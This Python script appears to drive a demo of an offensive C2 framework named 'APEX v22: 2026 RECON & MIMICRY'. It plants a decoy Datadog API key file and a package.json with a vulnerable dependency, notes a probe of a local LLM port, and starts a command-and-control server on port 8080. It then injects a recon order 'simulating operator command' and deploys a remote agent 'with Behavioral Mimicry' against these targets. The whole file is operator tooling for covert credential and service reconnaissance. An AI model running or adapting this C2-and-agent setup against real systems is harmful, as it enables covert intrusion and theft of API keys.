#!/usr/bin/env python3
import threading
import time
import os
import shutil
from rich.console import Console
from rich.panel import Panel
from apex_framework.orchestration.controller import CentralController
from apex_framework.orchestration.agent import RemoteAgent

console = Console()

def main():
    console.print(Panel("[bold magenta]APEX v22: 2026 RECON & MIMICRY[/]", expand=False))

    # 1. Setup Environment (Simulated 2026 Targets)
    with open("datadog.yaml", "w") as f: f.write("api_key: dd_fake_key")
    with open("package.json", "w") as f: f.write('{"dependencies": {"vulnerable-lib": "1.0.0"}}')
    # Simulate LLM Port (Mock)
    # We won't spin up a real LLM server, but the scanner probes port 11434.

    # 2. Start C2
    c2 = CentralController(port=8080)
    c2.start()

    # Inject a 2026 Recon Order directly into the C2 (Simulating operator command)
    # The default Controller logic is MapReduce, so we patch it for this demo or use the generic order structure
    # The Agent expects {"type": "RECON_2026"}
    # We need to ensure the Controller serves this.
    # Since the Controller has hardcoded "get_next_task", we need to override/mock that for the demo.
    c2.server.RequestHandlerClass.dispatcher.job_queue.put({"type": "RECON_2026", "id": "FUTURE_TASK"})

    time.sleep(1)

    # 3. Deploy Agent
    console.print("\n[SCENARIO] 🚀 Deploying Agent with Behavioral Mimicry...")
    agent = RemoteAgent(c2_url="http://localhost:8080")
    t = threading.Thread(target=agent.deploy)
    t.start()

    # Monitor for a bit
    time.sleep(15)

    console.print("\n[SCENARIO] 🛑 Mission Complete.")
    c2.stop()

    # Cleanup
    if os.path.exists("datadog.yaml"): os.remove("datadog.yaml")
    if os.path.exists("package.json"): os.remove("package.json")

if __name__ == "__main__":
    main()
